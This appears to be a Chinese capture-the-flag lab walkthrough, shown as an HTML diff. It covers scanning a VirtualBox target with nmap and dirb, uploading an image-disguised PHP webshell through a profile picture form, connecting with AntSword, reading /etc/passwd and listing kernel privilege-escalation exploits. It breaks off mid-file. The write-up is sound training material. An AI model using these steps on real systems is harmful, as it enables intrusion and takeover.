+|_http-server-header: BaseHTTP/0.3 Python/2.7.15rc1
+MAC Address: 08:00:27:E5:CD:43 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.16 seconds
+</code></pre></div></td></tr></table></div>
+<p>同时确定靶机操作系统为 <code>Ubuntu</code></p>
+<hr />
+<h3 id="getshell">Getshell 尝试</h3>
+<p>总共有两个 HTTP 端口：</p>
+<blockquote>
+<p>Port: 80</p>
+<p>一个 Pynch （没找到相关信息）的登录页面，可以注册</p>
+<p><img alt="image-20251028090249079" src="../images/image-20251028090249079.png" /></p>
+<p>有注册账号页面，先注册一个账号</p>
+<p><img alt="image-20251028093906515" src="../images/image-20251028093906515.png" /></p>
+<p>进入主站是一个交友软件（没用过）的界面，过会探索一下</p>
+<p><img alt="image-20251028094001050" src="../images/image-20251028094001050.png" /></p>
+<p>Port: 8000</p>
+<p>无法以正常的方式（GET POST 等等）访问</p>
+<p>但是 POST method 返回的信息和其他的方式不同，说明方法正确</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span></pre></div></td><td class="code"><div><pre><span></span><code>#<span class="w"> </span>GET<span class="w"> </span>METHOD
+Error<span class="w"> </span>response
+Error<span class="w"> </span>code<span class="w"> </span>501.
+Message:<span class="w"> </span>Unsupported<span class="w"> </span>method<span class="w"> </span>(&#39;GET&#39;).
+Error<span class="w"> </span>code<span class="w"> </span>explanation:<span class="w"> </span>501<span class="w"> </span>=<span class="w"> </span>Server<span class="w"> </span>does<span class="w"> </span>not<span class="w"> </span>support<span class="w"> </span>this<span class="w"> </span>operation.<span class="w"> </span>
+
+#<span class="w"> </span>POST<span class="w"> </span>METHOD
+<span class="nt">&lt;methodResponse&gt;</span>
+<span class="nt">&lt;fault&gt;</span>
+<span class="w">   </span><span class="nt">&lt;value&gt;</span>
+<span class="w">       </span><span class="nt">&lt;struct&gt;</span>
+<span class="w">           </span><span class="nt">&lt;member&gt;</span>
+<span class="w">               </span><span class="nt">&lt;name&gt;</span>faultCode<span class="nt">&lt;/name&gt;</span>
+<span class="w">               </span><span class="nt">&lt;value&gt;</span>
+<span class="w">                   </span><span class="nt">&lt;int&gt;</span>1<span class="nt">&lt;/int&gt;</span>
+<span class="w">               </span><span class="nt">&lt;/value&gt;</span>
+<span class="w">           </span><span class="nt">&lt;/member&gt;</span>
+<span class="w">           </span><span class="nt">&lt;member&gt;</span>
+<span class="w">               </span><span class="nt">&lt;name&gt;</span>faultString<span class="nt">&lt;/name&gt;</span>
+<span class="w">               </span><span class="nt">&lt;value&gt;</span>
+<span class="w">                   </span><span class="nt">&lt;string&gt;&lt;class</span><span class="w"> </span><span class="err">&#39;xml.parsers.expat.ExpatError&#39;</span><span class="nt">&gt;</span>:no<span class="w"> </span>element<span class="w"> </span>found:<span class="w"> </span>line<span class="w"> </span>1,<span class="w"> </span>column<span class="w"> </span>0<span class="nt">&lt;/string&gt;</span>
+<span class="w">                       </span><span class="nt">&lt;/value&gt;</span>
+<span class="w">                   </span><span class="nt">&lt;/member&gt;</span>
+<span class="w">               </span><span class="nt">&lt;/struct&gt;</span>
+<span class="w">           </span><span class="nt">&lt;/value&gt;</span>
+<span class="w">       </span><span class="nt">&lt;/fault&gt;</span>
+<span class="w">   </span><span class="nt">&lt;/methodResponse&gt;</span>
+</code></pre></div></td></tr></table></div>
+</blockquote>
+<p>先对 <code>10.0.2.6:80</code> 进行测试：</p>
+<h4 id="_4">地址爆破</h4>
+<p>在实际探索网站前用 dirb 爆破目录，收集一下基础信息：</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code>dirb http://10.0.2.6:80 /usr/share/dirb/wordlists/big.txt
+
+---- Scanning URL: http://10.0.2.6:80/ ----
+==&gt; DIRECTORY: http://10.0.2.6:80/data/                        
+==&gt; DIRECTORY: http://10.0.2.6:80/database/                       
+==&gt; DIRECTORY: http://10.0.2.6:80/functions/                          
+==&gt; DIRECTORY: http://10.0.2.6:80/images/                        
+==&gt; DIRECTORY: http://10.0.2.6:80/includes/                 
+==&gt; DIRECTORY: http://10.0.2.6:80/resources/                    
++ http://10.0.2.6:80/server-status (CODE:403|SIZE:296)
+</code></pre></div></td></tr></table></div>
+<p><code>/data</code> 和 <code>/image</code> 内是一些图片 sprite，<code>/resources</code> 内是一些 HTTP 前端的 JS/CSS 文件，而其余的 directory 提供了很多内容：</p>
+<p><img alt="result" src="../images/result.jpeg" /></p>
+<p>先看 SQL 文件，其中 <code>DDL.sql</code> 是注册用户用途，而 <code>DML.sql</code> 的内容比较有趣：</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">users</span><span class="p">(</span><span class="n">user_firstname</span><span class="p">,</span><span class="w"> </span><span class="n">user_lastname</span><span class="p">,</span><span class="w"> </span><span class="n">user_password</span><span class="p">,</span><span class="w"> </span><span class="n">user_email</span><span class="p">,</span><span class="w"> </span><span class="n">user_gender</span><span class="p">,</span><span class="w"> </span><span class="n">user_birthdate</span><span class="p">)</span>
+<span class="w">       </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="ss">&quot;Armin&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;Virgil&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;armin@gmail.com&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;M&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;2001-02-05&quot;</span><span class="p">);</span>
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">users</span><span class="p">(</span><span class="n">user_firstname</span><span class="p">,</span><span class="w"> </span><span class="n">user_lastname</span><span class="p">,</span><span class="w"> </span><span class="n">user_nickname</span><span class="p">,</span><span class="w"> </span><span class="n">user_password</span><span class="p">,</span><span class="w"> </span><span class="n">user_email</span><span class="p">,</span><span class="w"> </span><span class="n">user_gender</span><span class="p">,</span><span class="w"> </span><span class="n">user_birthdate</span><span class="p">,</span><span class="w"> </span><span class="n">user_status</span><span class="p">)</span>
+<span class="w">       </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="ss">&quot;Paul&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;James&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;Pynch&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;paul@gmail.com&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;M&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;1998-12-19&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;S&quot;</span><span class="p">);</span>
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">users</span><span class="p">(</span><span class="n">user_firstname</span><span class="p">,</span><span class="w"> </span><span class="n">user_lastname</span><span class="p">,</span><span class="w"> </span><span class="n">user_password</span><span class="p">,</span><span class="w"> </span><span class="n">user_email</span><span class="p">,</span><span class="w"> </span><span class="n">user_gender</span><span class="p">,</span><span class="w"> </span><span class="n">user_birthdate</span><span class="p">)</span>
+<span class="w">       </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="ss">&quot;Chris&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;Wilson&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;chris@gmail.com&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;M&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;1996-01-18&quot;</span><span class="p">);</span>
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">users</span><span class="p">(</span><span class="n">user_firstname</span><span class="p">,</span><span class="w"> </span><span class="n">user_lastname</span><span class="p">,</span><span class="w"> </span><span class="n">user_password</span><span class="p">,</span><span class="w"> </span><span class="n">user_email</span><span class="p">,</span><span class="w"> </span><span class="n">user_gender</span><span class="p">,</span><span class="w"> </span><span class="n">user_birthdate</span><span class="p">,</span><span class="w"> </span><span class="n">user_status</span><span class="p">)</span>
+<span class="w">       </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="ss">&quot;Rory&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;Blue&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;rory@gmail.com&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;F&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;1994-04-18&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;M&quot;</span><span class="p">);</span>
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">users</span><span class="p">(</span><span class="n">user_firstname</span><span class="p">,</span><span class="w"> </span><span class="n">user_lastname</span><span class="p">,</span><span class="w"> </span><span class="n">user_password</span><span class="p">,</span><span class="w"> </span><span class="n">user_email</span><span class="p">,</span><span class="w"> </span><span class="n">user_gender</span><span class="p">,</span><span class="w"> </span><span class="n">user_birthdate</span><span class="p">)</span>
+<span class="w">       </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="ss">&quot;Andrea&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;Surman&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;andrea@gmail.com&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;M&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;1994-06-06&quot;</span><span class="p">);</span>
+<span class="o">#</span><span class="w"> </span><span class="err">没有自己的注册信息？</span>
+
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">posts</span><span class="p">(</span><span class="n">post_caption</span><span class="p">,</span><span class="w"> </span><span class="n">post_time</span><span class="p">,</span><span class="w"> </span><span class="n">post_public</span><span class="p">,</span><span class="w"> </span><span class="n">post_by</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="ss">&quot;Hello there!&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;2017-12-23 00:50:06&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;Y&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">posts</span><span class="p">(</span><span class="n">post_caption</span><span class="p">,</span><span class="w"> </span><span class="n">post_time</span><span class="p">,</span><span class="w"> </span><span class="n">post_public</span><span class="p">,</span><span class="w"> </span><span class="n">post_by</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="ss">&quot;Paul James has changed his profile picture.&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;2017-12-23 00:50:06&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;N&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">posts</span><span class="p">(</span><span class="n">post_caption</span><span class="p">,</span><span class="w"> </span><span class="n">post_time</span><span class="p">,</span><span class="w"> </span><span class="n">post_public</span><span class="p">,</span><span class="w"> </span><span class="n">post_by</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="ss">&quot;A new artwork from the upcoming content.&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;2017-12-23 00:50:06&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;Y&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">);</span>
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">posts</span><span class="p">(</span><span class="n">post_caption</span><span class="p">,</span><span class="w"> </span><span class="n">post_time</span><span class="p">,</span><span class="w"> </span><span class="n">post_public</span><span class="p">,</span><span class="w"> </span><span class="n">post_by</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="ss">&quot;New Year Eve Fireworks&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;2017-12-23 00:50:06&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;Y&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">posts</span><span class="p">(</span><span class="n">post_caption</span><span class="p">,</span><span class="w"> </span><span class="n">post_time</span><span class="p">,</span><span class="w"> </span><span class="n">post_public</span><span class="p">,</span><span class="w"> </span><span class="n">post_by</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="ss">&quot;Visit our profile to check out the upcoming transfers and rumors for January 2018&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;2017-12-23 00:50:06&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;N&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">);</span>
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">posts</span><span class="p">(</span><span class="n">post_caption</span><span class="p">,</span><span class="w"> </span><span class="n">post_time</span><span class="p">,</span><span class="w"> </span><span class="n">post_public</span><span class="p">,</span><span class="w"> </span><span class="n">post_by</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="ss">&quot;Happy new year!&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;2017-12-23 00:50:06&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;N&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">);</span>
+
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">friendship</span><span class="p">(</span><span class="n">user1_id</span><span class="p">,</span><span class="w"> </span><span class="n">user2_id</span><span class="p">,</span><span class="w"> </span><span class="n">friendship_status</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">friendship</span><span class="p">(</span><span class="n">user1_id</span><span class="p">,</span><span class="w"> </span><span class="n">user2_id</span><span class="p">,</span><span class="w"> </span><span class="n">friendship_status</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">friendship</span><span class="p">(</span><span class="n">user1_id</span><span class="p">,</span><span class="w"> </span><span class="n">user2_id</span><span class="p">,</span><span class="w"> </span><span class="n">friendship_status</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">friendship</span><span class="p">(</span><span class="n">user1_id</span><span class="p">,</span><span class="w"> </span><span class="n">user2_id</span><span class="p">,</span><span class="w"> </span><span class="n">friendship_status</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">friendship</span><span class="p">(</span><span class="n">user1_id</span><span class="p">,</span><span class="w"> </span><span class="n">user2_id</span><span class="p">,</span><span class="w"> </span><span class="n">friendship_status</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">friendship</span><span class="p">(</span><span class="n">user1_id</span><span class="p">,</span><span class="w"> </span><span class="n">user2_id</span><span class="p">,</span><span class="w"> </span><span class="n">friendship_status</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+</code></pre></div></td></tr></table></div>
+<p>这里存储了一些用户数据，尤其是这个人的：</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">users</span><span class="p">(</span><span class="n">user_firstname</span><span class="p">,</span><span class="w"> </span><span class="n">user_lastname</span><span class="p">,</span><span class="w"> </span><span class="n">user_nickname</span><span class="p">,</span><span class="w"> </span><span class="n">user_password</span><span class="p">,</span><span class="w"> </span><span class="n">user_email</span><span class="p">,</span><span class="w"> </span><span class="n">user_gender</span><span class="p">,</span><span class="w"> </span><span class="n">user_birthdate</span><span class="p">,</span><span class="w"> </span><span class="n">user_status</span><span class="p">)</span>
+<span class="w">       </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="ss">&quot;Paul&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;James&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;Pynch&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;paul@gmail.com&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;M&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;1998-12-19&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;S&quot;</span><span class="p">);</span>
+</code></pre></div></td></tr></table></div>
+<p>这个人的 <code>nickname</code> 恰好对应网站开头的 Welcome to Pynch，猜测他是管理员</p>
+<p>其他的 php 文件看不到源码，但是也能提供信息，比如 <code>upload.php</code> 很可能存在文件马上传</p>
+<h4 id="_5">访问主站</h4>
+<p>用之前注册的账号进行主站访问，发现了 Profile 页面
+<img alt="image-20251028120934144" src="../images/image-20251028120934144.png" /></p>
+<p>注意到有上传图片的地方，考虑上传图片马</p>
+<p><img alt="image-20251028121222691" src="../images/image-20251028121222691.png" /></p>
+<p>上传成功了，右键得到图片地址 <code>http://10.0.2.6/data/images/profiles/3.php5</code></p>
+<p><img alt="image-20251028121350771" src="../images/image-20251028121350771.png" /></p>
+<p>打开后用 AntSword 进行连接</p>
+<p>（上下两个配图不一样是因为我第一次用的图片马没有被正确识别，换了一个）</p>
+<p><img alt="image-20251028123349431" src="../images/image-20251028123349431.png" /></p>
+<p><img alt="image-20251028123428211" src="../images/image-20251028123428211.png" /></p>
+<p>打开虚拟终端，成功 Getshell</p>
+<p><img alt="image-20251028123959131" src="../images/image-20251028123959131.png" /></p>
+<h3 id="_6">提权尝试</h3>
+<p>有内核漏洞，但是如果直接用这个就没有意思了</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code>Linux Kernel 4.10 &lt; 5.1.17 - &#39;PTRACE_TRACEME&#39; pkexec Local Privilege Escalation                                   | linux/local/47163.c
+Linux Kernel 4.15.x &lt; 4.19.2 - &#39;map_write() CAP_SYS_ADMIN&#39; Local Privilege Escalation (cron Method)               | linux/local/47164.sh
+Linux Kernel 4.15.x &lt; 4.19.2 - &#39;map_write() CAP_SYS_ADMIN&#39; Local Privilege Escalation (dbus Method)               | linux/local/47165.sh
+Linux Kernel 4.15.x &lt; 4.19.2 - &#39;map_write() CAP_SYS_ADMIN&#39; Local Privilege Escalation (ldpreload Method)          | linux/local/47166.sh
+Linux Kernel 4.15.x &lt; 4.19.2 - &#39;map_write() CAP_SYS_ADMIN&#39; Local Privilege Escalation (polkit Method)             | linux/local/47167.sh
+</code></pre></div></td></tr></table></div>
+<p>搜一下用户，发现 <code>socnet</code> 用户有 <code>/bin/bash</code> </p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span></pre></div></td><td class="code"><div><pre><span></span><code>(www-data:/var/www/html/data/images/profiles) $ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+socnet:x:1000:1000:socnet2:/home/socnet:/bin/bash       &lt;------ this
+mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
+</code></pre></div></td></tr></table></div>
+<p>到目录下搜索</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span></pre></div></td><td class="code"><div><pre><span></span><code>(www-data:/var/www/html/data/images/profiles) $ cd /home/socnet
+(www-data:/home/socnet) $ ls -l -a
+total 60
+drwxr-xr-x 6 socnet socnet 4096 Oct 29  2018 .
+drwxr-xr-x 3 root   root   4096 Oct 29  2018 ..
+-rw-r--r-- 1 socnet socnet 3771 Apr  4  2018 .bashrc
+drwx------ 2 socnet socnet 4096 Oct 29  2018 .cache
+-rw------- 1 socnet socnet 1040 Oct 29  2018 .gdb_history
+-rw-rw-r-- 1 socnet socnet   22 Oct 29  2018 .gdbinit
+drwx------ 3 socnet socnet 4096 Oct 29  2018 .gnupg
+drwxrwxr-x 3 socnet socnet 4096 Oct 29  2018 .local
+-rw------- 1 socnet socnet  579 Oct 29  2018 .mysql_history
+-rw-r--r-- 1 socnet socnet  807 Apr  4  2018 .profile
+-rw-rw-r-- 1 socnet socnet   66 Oct 29  2018 .selected_editor
+-rw-r--r-- 1 socnet socnet    0 Oct 29  2018 .sudo_as_admin_successful
+-rwsrwsr-x 1 root   socnet 6952 Oct 29  2018 add_record     # suid? 
+-rw-rw-r-- 1 socnet socnet  904 Oct 29  2018 monitor.py
+drwxrwxr-x 4 socnet socnet 4096 Oct 29  2018 peda
+</code></pre></div></td></tr></table></div>
+<p><del>sus</del> <code>.sudo_as_admin_successful</code> 文件提示这里有 sudo 的可能性（其实没什么关联），而 <code>monitor.py</code> 文件在之前的 post 中有提示</p>
+<p><img alt="image-20251028130736602" src="../images/image-20251028130736602.png" /></p>
+<p>看看 <code>monitor.py</code> 的内容：</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1">#my remote server management API</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">SimpleXMLRPCServer</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
+
+<span class="c1"># 一个在启动服务时随机生成的四位数 passcode</span>
+<span class="c1"># 这个密码在服务启动期间不变</span>
